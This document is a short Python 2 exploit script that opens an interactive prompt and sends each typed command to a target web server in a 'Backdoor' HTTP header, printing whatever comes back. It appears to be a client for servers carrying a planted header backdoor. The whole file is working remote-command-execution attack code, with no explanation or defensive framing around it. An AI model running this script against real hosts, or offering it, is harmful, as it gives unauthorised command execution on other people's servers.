
   
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import sys

def exploit(host, port, command):
    headers = {
        "Backdoor": command
    }
    url = "http://%s:%d/" % (host, port)
    response = requests.get(url, headers=headers)
    content = response.content
    print content

def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    while True:
        command = raw_input("$ ")
        if command == "exit":
            break
        exploit(host, port, command)


if __name__ == "__main__":
    main()
    
###############################
##
##    
